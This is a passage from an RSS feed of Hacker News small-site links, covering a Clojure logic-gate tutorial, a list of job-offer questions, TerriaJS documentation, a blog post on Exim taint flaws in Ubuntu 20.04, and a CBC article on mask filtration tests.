<span>               (</span><span>trigger</span><span> </span><span>:a</span><span> </span><span>1</span><span>))]</span>
<span>    (</span><span>testing</span><span> </span><span>"a is off"</span>
<span>      (</span><span>is</span><span> (</span><span>=</span><span> '(</span><span>0</span><span> </span><span>1</span><span>) (</span><span>charges</span><span> s1 [</span><span>:a</span><span> </span><span>:o</span><span>]))))</span>
<span>    (</span><span>testing</span><span> </span><span>"a is on"</span>
<span>      (</span><span>is</span><span> (</span><span>=</span><span> '(</span><span>1</span><span> </span><span>0</span><span>) (</span><span>charges</span><span> s2 [</span><span>:a</span><span> </span><span>:o</span><span>]))))))</span></code></pre><pre><code><span>; Ran 1 test containing 2 assertions.</span>
<span>; No failures</span></code></pre><p>It works! Onwards.</p><p>What if we plugged the output of one <code>NAND</code> as the input of a <code>NOT</code> gate?</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NjQwLWI1ZDAwNzAwLTBjOTItMTFlYi04MzBhLWVjMzc1Zjk5Y2E1ZC5wbmc" alt="image"></span></p><p>Well, it would be opposite of a <code>NAND</code> gate: <code>d</code> would only be 1 when <em>both</em> <code>a</code> and <code>b</code> are 1. That’s the <code>AND</code> gate:</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NjU2LWJlMjg0MjAwLTBjOTItMTFlYi04N2Q2LTM0MTJhMDY4YWEyZS5wbmc" alt="image"></span></p><p>To implement <code>AND</code>, we can follow just that schematic: </p><pre><code><span>(</span><span>defn</span><span> wire-and-gate [state a b o]</span>
<span>  (</span><span>let</span><span> [nand-o </span><span>:c</span><span>]</span>
<span>    (</span><span>-&gt;</span><span> state</span>
<span>        (</span><span>wire-nand-gate</span><span> a b nand-o)</span>
<span>        (</span><span>wire-not-gate</span><span> nand-o o))))</span></code></pre><p>This would work…almost. The tricky thing here is that inside the function we have an “intermediary” wire <code>c</code>, which connects the <code>NAND</code> gate and <code>NOT</code> gate. If we made <em>two</em> <code>AND</code> gates for example, then they would share the same wire <code>:c</code>! </p><p>To fix this, let’s write some helper functions to create unique wires: </p><pre><code><span>(</span><span>def</span><span> _u (</span><span>atom</span><span> {}))</span>
<span>(</span><span>defn</span><span> uniq-n [k]</span>
<span>  (</span><span>swap!</span><span> _u update k (</span><span>fn</span><span> [i] (</span><span>inc</span><span> (</span><span>or</span><span> i </span><span>0</span><span>))))</span>
<span>  (</span><span>get</span><span> @_u k))</span>
<!-- -->
<span>(</span><span>defn</span><span> kw [&amp; args]</span>
<span>  (</span><span>-&gt;&gt;</span><span> args</span>
<span>       (</span><span>map</span><span> (</span><span>fn</span><span> [x] (</span><span>if</span><span> ((</span><span>some-fn</span><span> keyword? symbol?) x)</span>
<span>                      (</span><span>name</span><span> x)</span>
<span>                      x)))</span>
<span>       (</span><span>apply</span><span> str)</span>
<span>       keyword))</span>
<!-- -->
<span>(</span><span>defn</span><span> wire</span>
<span>  ([n]</span>
<span>   (</span><span>let</span><span> [i (</span><span>uniq-n</span><span> n)]</span>
<span>     (</span><span>if</span><span> (</span><span>&gt;</span><span> i </span><span>1</span><span>) (</span><span>kw</span><span> n </span><span>"#"</span><span> i) n))))</span></code></pre><p>Let’s see how it looks:</p><pre><code><span>[(</span><span>wire</span><span> </span><span>:a</span><span>) (</span><span>wire</span><span> </span><span>:a</span><span>)]</span>
<span>=&gt; [</span><span>:a</span><span> </span><span>:a#2</span><span>]</span></code></pre><p>Now if we create a wire with a name that already exists, it’ll add a nice little “#2” beside it. </p><p>Nice! Let’s use it in <code>wire-and-gate</code></p><pre><code><span>(</span><span>defn</span><span> wire-and-gate [state a b o]</span>
<span>  (</span><span>let</span><span> [nand-o (</span><span>wire</span><span> (</span><span>kw</span><span> a b </span><span>:and-nand-o</span><span>))]</span>
<span>    (</span><span>-&gt;</span><span> state</span>
<span>        (</span><span>wire-nand-gate</span><span> a b nand-o)</span>
<span>        (</span><span>wire-not-gate</span><span> nand-o o))))</span></code></pre><p>If we test this out… </p><pre><code><span>(</span><span>deftest</span><span> test-and-gate</span>
<span>  (</span><span>let</span><span> [s1 (</span><span>-&gt;</span><span> empty-state</span>
<span>               (</span><span>wire-and-gate</span><span> </span><span>:a</span><span> </span><span>:b</span><span> </span><span>:o</span><span>)</span>
<span>               (</span><span>trigger-many</span><span> [</span><span>:a</span><span> </span><span>:b</span><span>] [</span><span>1</span><span> </span><span>0</span><span>]))</span>
<span>        s2 (</span><span>-&gt;</span><span> s1</span>
<span>               (</span><span>trigger</span><span> </span><span>:b</span><span> </span><span>1</span><span>))]</span>
<span>    (</span><span>testing</span><span> </span><span>"just a is on"</span>
<span>      (</span><span>is</span><span> (</span><span>=</span><span> '(</span><span>1</span><span> </span><span>0</span><span> </span><span>0</span><span>) (</span><span>charges</span><span> s1 [</span><span>:a</span><span> </span><span>:b</span><span> </span><span>:o</span><span>]))))</span>
<span>    (</span><span>testing</span><span> </span><span>"a and b on"</span>
<span>      (</span><span>is</span><span> (</span><span>=</span><span> '(</span><span>1</span><span> </span><span>1</span><span> </span><span>1</span><span>) (</span><span>charges</span><span> s2 [</span><span>:a</span><span> </span><span>:b</span><span> </span><span>:o</span><span>]))))))</span></code></pre><pre><code><span>; …</span></code></pre></span></p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://stopa.io/post/258">https://stopa.io/post/258</a></em></p>]]>
            </description>
            <link>https://stopa.io/post/258</link>
            <guid isPermaLink="false">hacker-news-small-sites-25086256</guid>
            <pubDate>Fri, 13 Nov 2020 19:20:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Questions to ask before accepting a tech job offer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25086061">thread link</a>) | @mironov
<br/>
November 13, 2020 | https://blog.mironov.live/questions-to-ask-before-accepting-a-tech-job-offer/ | <a href="https://web.archive.org/web/*/https://blog.mironov.live/questions-to-ask-before-accepting-a-tech-job-offer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Don’t ask any questions during your job interview and you are doomed. Days packed with calls, vague tasks descriptions, bureaucratic release process and micro-management — I’ve seen all of these.</p>
<p>The more you know the company, the less likely you will be negatively surprised later. It can be a dealbreaker if company values or views contradict yours.</p>
<blockquote>
<p>“Spend more time making the big decisions. There are basically three really big decisions you make in your early life: where you live, who you’re with, and what you do.” — <a href="https://www.navalmanack.com/almanack-of-naval-ravikant/prioritize-and-focus">Naval Ravikant</a></p>
</blockquote>
<p>Here I’m trying to collect all the useful questions grouped by different areas. Feel free to pick the ones that resonate with you.</p>

<ul>
<li>How many calls do developers have each week on average?</li>
<li>Do you favor async communication over calls?</li>
<li>Do you allow hours for deep work (being offline)?</li>
<li>What tools the team is using for task management?</li>
<li>How the invoicing process is organized?</li>
<li>Is there time to do side work and research?</li>
<li>Any required time overlap?</li>
<li>Do they use time trackers?</li>
</ul>

<ul>
<li>Can I see an example of a task (description, spec, etc)?</li>
<li>How do you deploy features and who is responsible for that?</li>
<li>Do you have a release schedule or continuous delivery?</li>
<li>What is your approach for tests (pyramid testing)?</li>
<li>What technology stack do you use?</li>
</ul>

<ul>
<li>What are the near plans for the company: acquisition, IPO, investments?</li>
<li>Are there performance reviews, 1-on-1s, etc?</li>
<li>Are there any employee benefits?</li>
<li>What is the pay raise process?</li>
</ul>
<p>Am I missing an important question? Please let me know in the comments section below.</p>
<p>Thanks to <a href="https://twitter.com/veryfyodor">Fyodor Ivanischev</a> and <a href="https://www.marioperez.me/">Mario Perez</a> for helping with this list.</p></div><p>If you have found a spelling error, please, notify me by selecting that text and pressing <em>Ctrl+Enter</em>.</p></div>]]>
            </description>
            <link>https://blog.mironov.live/questions-to-ask-before-accepting-a-tech-job-offer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25086061</guid>
            <pubDate>Fri, 13 Nov 2020 19:04:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[TerriaJS is an open-source framework for web-based geospatial catalog explorers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25085926">thread link</a>) | @bryanrasmussen
<br/>
November 13, 2020 | https://docs.terria.io/guide/ | <a href="https://web.archive.org/web/*/https://docs.terria.io/guide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <article>
              
                
                
                  
                
                
                  
                
                <p><a href="http://terria.io/">TerriaJS</a> is an open-source framework for web-based geospatial catalog explorers.</p>
<ul>
<li><a href="https://docs.terria.io/guide/getting-started/">Getting Started</a>: Quick start guide to building your first TerriaJS application.</li>
<li><a href="https://docs.terria.io/guide/customizing/">Customizing</a>: Configure and tweak a TerriaJS application, including skinning and setting up the catalog.</li>
<li><a href="https://docs.terria.io/guide/connecting-to-data/">Connecting to Data</a>: Connect TerriaJS to your servers and data.</li>
<li><a href="https://docs.terria.io/guide/deploying/">Deploying</a>: Deploy a TerriaJS application in simple and advanced scenarios.</li>
<li><a href="https://docs.terria.io/guide/contributing/">Contributing</a>: Add new features to TerriaJS, be part of the TerriaJS development team, set up a development environment, write tests, and perform code reviews.</li>
</ul>
<p>Looking for help using a TerriaJS-based site? Try the <a href="http://nationalmap.gov.au/help/help.html">NationalMap user documentation</a>.</p>
<p>This documentation is maintained at <a href="https://github.com/TerriaJS/TerriaJS/tree/master/doc">github.com/TerriaJS/TerriaJS/tree/master/doc</a>.</p>
<p>It can be viewed at <a href="https://docs.terria.io/">docs.terria.io</a>.</p>
                
              
              
                


              
            </article>
          </div></div>]]>
            </description>
            <link>https://docs.terria.io/guide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25085926</guid>
            <pubDate>Fri, 13 Nov 2020 18:50:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[If you use Exim on Ubuntu, you probably want to skip Ubuntu 20.04]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25085666">thread link</a>) | @ink_13
<br/>
November 13, 2020 | https://utcc.utoronto.ca/~cks/space/blog/linux/Ubuntu2004EximSkip | <a href="https://web.archive.org/web/*/https://utcc.utoronto.ca/~cks/space/blog/linux/Ubuntu2004EximSkip">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>If you use Exim on Ubuntu, you probably want to skip Ubuntu 20.04</h2>

	<p><small>November 13, 2020</small></p>
</div><div><p>The <a href="https://www.exim.org/">Exim</a> MTA (Mail Transfer Agent, aka
mailer) recently added a mandatory <a href="https://utcc.utoronto.ca/~cks/space/blog/sysadmin/EximTaintingPain">new security feature to 'taint'
data taken directly from the outside world</a>,
with the goal of reducing the potential for future issues like
<a href="https://exim.org/static/doc/security/CVE-2019-13917.txt">CVE-2019-13917</a>.
Things that are tainted include not just obvious things like the
contents of message headers, but also slightly less obvious things
like the source and especially destination addresses of messages,
both their domains and their local parts. There are many common
uses of now-tainted data in many parts of delivering messages; for
example, writing mail to '/var/mail/$local_part' involves use of
tainted data (even if you've verified that the local address exists
as a user). In order to still be usable, Exim supports a variety
of methods to generate untainted versions of this tainted data.</p>

<p>Exim introduced tainting in Exim 4.93, released in December of 2019.
Unfortunately this version's support for tainting is flawed, and
part of the flaws are that a significant number of methods of
de-tainting data don't work. It's probably possible to craft an
Exim 4.93 configuration that works properly with tainted data, but
it is going to be a very ugly and artificial configuration. Exim
4.94 improves the situation significantly, but even then <a href="https://lists.exim.org/lurker/message/20201110.133127.e0679d8a.en.html">apparently
you should use it with additional fixes</a>.</p>

<p>Ubuntu 20.04 ships a somewhat patched version of Exim 4.93, but
<a href="https://lists.exim.org/lurker/message/20201109.184343.ef125168.en.html">it has significant de-tainting flaws and limitations</a>
which mean that you don't want to use it in its current state. As
is normal and traditional, there's essentially no prospect that
Ubuntu will update to Exim 4.94+ over the lifetime of Ubuntu 20.04;
what we have today in 20.04 is what we get. As a result, if you use
Exim on Ubuntu, I think that you should skip 20.04. Run your Exim
machines on 18.04 LTS until 22.04 LTS comes out with a hopefully
much better version of Exim.</p>

<p>If you absolutely must run Ubuntu 20.04 with some version of Exim,
I don't recommend building your own from upstream sources because
<a href="https://utcc.utoronto.ca/~cks/space/blog/sysadmin/BuildingPackagesFlaws">that has inherent problems</a>.
The Debian source packages for 4.94 (from testing and unstable)
appear to rebuild and work fine on Ubuntu 20.04, so I'd suggest
starting from them. Possibly you could even use the Debian binary
packages, although I haven't tried that and would be somewhat wary.</p>

<p>(It's possible that someone will put together a PPA for the Debian
packages rebuilt on Ubuntu 20.04. It won't be me, as we're skipping
20.04 for our Exim machines. It's also possible that someone will
get the Exim 4.94 package from Ubuntu 20.10 included in the 20.04
<a href="https://help.ubuntu.com/community/UbuntuBackports">Ubuntu Backports</a>.
<a href="https://wiki.ubuntu.com/UbuntuBackports">Anyone can make the request</a>,
after all (but it won't be us).)</p>
</div></div>]]>
            </description>
            <link>https://utcc.utoronto.ca/~cks/space/blog/linux/Ubuntu2004EximSkip</link>
            <guid isPermaLink="false">hacker-news-small-sites-25085666</guid>
            <pubDate>Fri, 13 Nov 2020 18:30:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Twenty different masks tested. Here's what will best protect during the pandemic]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25085480">thread link</a>) | @pseudolus
<br/>
November 13, 2020 | https://www.cbc.ca/news/canada/marketplace-masks-test-1.5795481 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/marketplace-masks-test-1.5795481">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Public health officials have said masks are critical to reducing the spread of COVID-19, but rigorous tests conducted on behalf of CBC's Marketplace found that while some work very well, others offer little protection from particles that transmit the novel coronavirus. And one type of mask can even spread the particles to others.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5795496.1604949380!/fileImage/httpImage/image.png_gen/derivatives/16x9_780/mask-grid.png"></p></div><figcaption>A selection of some of the masks Marketplace tested.<!-- --> <!-- -->(CBC)</figcaption></figure><p><span><p>Wearing a mask is critical to reducing the spread of COVID-19, but&nbsp;rigorous tests conducted on behalf of CBC's <em>Marketplace</em> found that while some work very well, others&nbsp;offer little protection from the particles that transmit the novel coronavirus. One type of mask can even spread those particles to others.</p>  <p>Months into the pandemic, there are still no standards for consumer masks. So <em>Marketplace</em> opted to compare more than two-dozen masks to what is commonly considered the gold standard in protecting health-care workers from infectious diseases like COVID-19 —&nbsp;the N95 mask.&nbsp;</p>  <p><em>Marketplace</em> purchased the masks in stores and online from a variety of sellers. The masks were also made out of varying materials and featured different designs.&nbsp;</p>  <p><em>Marketplace</em> put the masks through the rigorous National Institute for Occupational Safety and Health (NIOSH) standard test, conducted at a lower air-flow regimen to reflect normal breathing. The test is usually reserved for N95s and personal protective equipment (PPE) intended for health-care workers. A standard <a href="https://www.cdc.gov/niosh/npptl/stps/pdfs/TEB-APR-STP-0059-508.pdf"><u>NIOSH aerosol tes</u></a>t measures filtration efficiency, meaning the quantity of particles the mask filters out as the wearer breathes in.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_300/marketplace-masks-lab-tests.png 300w,https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_460/marketplace-masks-lab-tests.png 460w,https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_620/marketplace-masks-lab-tests.png 620w,https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_780/marketplace-masks-lab-tests.png 780w,https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_1180/marketplace-masks-lab-tests.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795516.1604950465!/fileImage/httpImage/image.png_gen/derivatives/original_780/marketplace-masks-lab-tests.png"></p></div><figcaption>An image shows leakage from an ill-fitting mask during Marketplace’s lab test at the University of Toronto’s Dalla Lana School of Public Health. <!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p>An N95 mask must have a 95 per cent filtration efficiency.&nbsp;</p>  <p>"This is the benchmark test. And it's actually useful because it allows us to compare consumer market masks to masks that we know a lot about," said&nbsp;James Scott, a professor from the University of Toronto's Dalla Lana School of Public Health. Scott is a specialist in bioaerosols and runs the lab where <em>Marketplace</em>'s tests were run.</p>  <ul>   <li><strong>Watch <em>Marketplace</em> Fridays at 8:00&nbsp;p.m., 8:30 p.m. NT, or stream&nbsp;any time&nbsp;on <a href="https://gem.cbc.ca/season/marketplace/season-47/8984c269-dae4-4a7b-b23a-d7df38647f09">CBC Gem</a></strong></li>  </ul>  <p>The test pulls a constant breath of air containing tiny salt particles through the mask material. The salt particles are similar in size to particles able to contain the coronavirus that might originate from droplets expelled by an infected person's breath, cough or sneeze. During the test, samples of air inside and outside the mask are compared to see how effective the mask is at reducing the level of particles.</p>  <p>Previous tests on consumer masks have commonly&nbsp;looked at how masks can help block particles&nbsp;when coughing or sneezing and&nbsp;prevent transmission to others.&nbsp;But the <em>Marketplace </em>test&nbsp;shows that certain materials make some masks better at limiting wearers'&nbsp;exposure by filtering what they&nbsp;breathe in, Scott said.</p>  <p>"Even fairly low-efficiency masks are actually quite effective at catching much larger particles. But, it takes a really good mask to catch the small ones as well. And we know that the virus will travel not only on the big ones but the small ones as well," said Scott.</p>  <p><em><strong>PHOTOS | A closer look at filtration efficiency of mask materials:</strong></em></p>    <h2>Results</h2>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_300/masks-graphic.png 300w,https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_460/masks-graphic.png 460w,https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_620/masks-graphic.png 620w,https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_780/masks-graphic.png 780w,https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_1180/masks-graphic.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5799764.1605212545!/fileImage/httpImage/image.png_gen/derivatives/original_780/masks-graphic.png"></p></div><figcaption> <!-- -->(CBC)</figcaption></figure></span></p>  <h2>Polypropylene fabric masks as good as N95</h2>  <p><em>Marketplace</em>'s test found some masks are just as good as an N95 when it comes to filtering out those potentially harmful particles, including one made with something called polypropylene fabric.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_300/polypropylene-mask.png 300w,https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_460/polypropylene-mask.png 460w,https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_620/polypropylene-mask.png 620w,https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_780/polypropylene-mask.png 780w,https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_1180/polypropylene-mask.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795523.1604950756!/fileImage/httpImage/image.png_gen/derivatives/original_780/polypropylene-mask.png"></p></div><figcaption>A mask with an inner layer of melt-blown non-woven polypropylene and outer layers of cotton.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p>Polypropylene fabric, in this case, is a melt-blown, non-woven plastic fabric. Melt-blown, non-woven polypropylene (NWPP) is <a href="https://www.mckinsey.com/~/media/McKinsey/About%20Us/COVID%20Response%20Center/PDFs/COVID-19-PPE-Ops-Airway-Protection.pdf"><u>commonly used in surgical and N95 masks.</u></a></p>  <p>The consumer mask <em>Marketplace</em> tested with an inner layer of melt-blown, non-woven polypropylene fabric and outer layers of cotton had filtration efficiency rates as high as an N95. Scott said the combination of multiple materials contributed to the strong result.&nbsp;</p>  <p>"This is a really good example of multiple layers of different materials combining to make something greater than the sum of the parts," said Scott.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795527.1604950877!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/blue-three-ply-mask.jpg 300w,https://i.cbc.ca/1.5795527.1604950877!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/blue-three-ply-mask.jpg 460w,https://i.cbc.ca/1.5795527.1604950877!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/blue-three-ply-mask.jpg 620w,https://i.cbc.ca/1.5795527.1604950877!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/blue-three-ply-mask.jpg 780w,https://i.cbc.ca/1.5795527.1604950877!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/blue-three-ply-mask.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795527.1604950877!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/blue-three-ply-mask.jpg"></p></div><figcaption>An example of a blue three-ply surgical-type mask Marketplace tested.  <!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <h2>Blue three-ply surgical-type masks</h2>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795529.1604950989!/fileImage/httpImage/image.png_gen/derivatives/original_300/2-ply-high-thread-count-cotton-mask.png 300w,https://i.cbc.ca/1.5795529.1604950989!/fileImage/httpImage/image.png_gen/derivatives/original_460/2-ply-high-thread-count-cotton-mask.png 460w,https://i.cbc.ca/1.5795529.1604950989!/fileImage/httpImage/image.png_gen/derivatives/original_620/2-ply-high-thread-count-cotton-mask.png 620w,https://i.cbc.ca/1.5795529.1604950989!/fileImage/httpImage/image.png_gen/derivatives/original_780/2-ply-high-thread-count-cotton-mask.png 780w,https://i.cbc.ca/1.5795529.1604950989!/fileImage/httpImage/image.png_gen/derivatives/original_1180/2-ply-high-thread-count-cotton-mask.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795529.1604950989!/fileImage/httpImage/image.png_gen/derivatives/original_780/2-ply-high-thread-count-cotton-mask.png"></p></div><figcaption>One of the two-ply, high thread count cotton masks Marketplace tested.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p>Blue three-ply surgical-type disposable masks also reported some of the highest filtration efficiency rates in the <em>Marketplace</em> test, which was of no surprise to Scott, as most contain that melt-blown, non-woven polypropylene fabric.&nbsp;</p>  <p>"It's this interwoven matrix of fibre. Air needs to travel around each one of those fibres and it meets the next fibre and it needs to bend its path. So as it does that, those fabrics pull out lots and lots of particles," said Scott.</p>  <h2>Two-ply and three-ply cotton masks&nbsp;</h2>  <p><em>Marketplace</em> also tested a number of cotton masks, including a two-layer, 100 per cent cotton mask, and a three-layer, 100 per cent cotton mask. More layers of cotton didn't necessarily mean a better mask. The three-layer cotton mask <em>Marketplace</em> tested did not perform well, but the two-layer cotton mask did.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795534.1604951296!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/three-ply-cotton-mask.jpg 300w,https://i.cbc.ca/1.5795534.1604951296!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/three-ply-cotton-mask.jpg 460w,https://i.cbc.ca/1.5795534.1604951296!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/three-ply-cotton-mask.jpg 620w,https://i.cbc.ca/1.5795534.1604951296!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/three-ply-cotton-mask.jpg 780w,https://i.cbc.ca/1.5795534.1604951296!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/three-ply-cotton-mask.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795534.1604951296!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/three-ply-cotton-mask.jpg"></p></div><figcaption>One of the three-ply cotton masks Marketplace tested. Thread count unknown.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p>There was also a noticeable jump in filtration efficiency in cotton masks made with a higher thread count.</p>  <p>Masks made with 600 and 680 thread count cotton had filtration efficiencies almost twice that of the other cotton masks tested. Scott said the weave of a fabric is critical when it comes to catching those potentially harmful particles.&nbsp;</p>  <p>When it comes to cotton masks, <em>Marketplace</em>'s test suggested&nbsp;the tighter the weave, the better.&nbsp;</p>  <p>Scott points out that manufacturers of consumer masks are not currently required to disclose details about thread count, and without that information it's difficult to say for certain what contributed to some cotton masks' poorer performance.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_300/valve-masks.png 300w,https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_460/valve-masks.png 460w,https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_620/valve-masks.png 620w,https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_780/valve-masks.png 780w,https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_1180/valve-masks.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_780/valve-masks.png"></p></div><figcaption>Valve masks, like the one seen here, are not effective at blocking COVID-19.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <h2>Masks to avoid</h2>  <p>Scott said consumers should avoid wearing valve masks. While they are useful for protecting someone from inhaling paint fumes or when working in a wood shop, they do not help control the spread of the virus.</p>  <p>The reason is simple.&nbsp;</p>  <p>"Air only moves through the filter part of the mask when air comes in. It doesn't move through the filter to exhale. It moves through the valve," he said. "So there's nothing to intercept those particles that you may be shedding into the environment."</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_300/valve-masks-pm-security-detail.png 300w,https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_460/valve-masks-pm-security-detail.png 460w,https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_620/valve-masks-pm-security-detail.png 620w,https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_780/valve-masks-pm-security-detail.png 780w,https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_1180/valve-masks-pm-security-detail.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_780/valve-masks-pm-security-detail.png"></p></div><figcaption>Although valve masks are not recommended by the Public Health Agency of Canada, some members of the federal security force at Canada’s Parliament in Ottawa were seen wearing them.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p><a href="https://www.torontopearson.com/en/whats-happening/stories/change-in-mask-regulations"><u>Transport Canada</u></a> has banned the wearing of valve masks, as has <a href="https://www.viarail.ca/en/preventive-measures-COVID-19#in-station"><u>Via Rail</u></a>, and airlines such as <a href="https://www.aircanada.com/ca/en/aco/home/book/travel-news-and-updates/2020/travelguidelines.html"><u>Air Canada</u></a>. <a href="https://www.toronto.ca/wp-content/uploads/2020/04/97f8-COVID-19-Guidance-for-Use-of-Face-Masks-and-Coverings-by-Public.pdf"><u>Toronto</u></a>, <a href="https://www.ottawapublichealth.ca/en/public-health-topics/masks.aspx"><u>Ottawa Public Health</u></a>, <a href="https://www.hamilton.ca/coronavirus/face-coverings-and-masks"><u>Hamilton Public Health</u></a> and the <a href="http://www.bccdc.ca/Health-Professionals-Site/Documents/Face-masks.pdf"><u>BC CDC</u></a> all recommend against the use of valve masks.</p>  <p>The Public Health Agency of Canada (PHAC) said: "<a href="https://protect-eu.mimecast.com/s/OstXC19nnf0jLkiLNse4?domain=canada.ca"><u>Masks with exhalation valves are not recommended,</u></a> because they don't protect others from COVID-19 and don't limit the spread of the virus."&nbsp;</p>  <ul>   <li><strong>Subscribe to the weekly <a href="https://subscriptions.cbc.ca/listmanagement/forms/marketplace-watchdog"><em>Marketplace </em>newsletter</a></strong></li>  </ul>  <p>Despite this, some members of the federal security force at Canada's Parliament in Ottawa, mandated to provide physical security for parliamentarians, 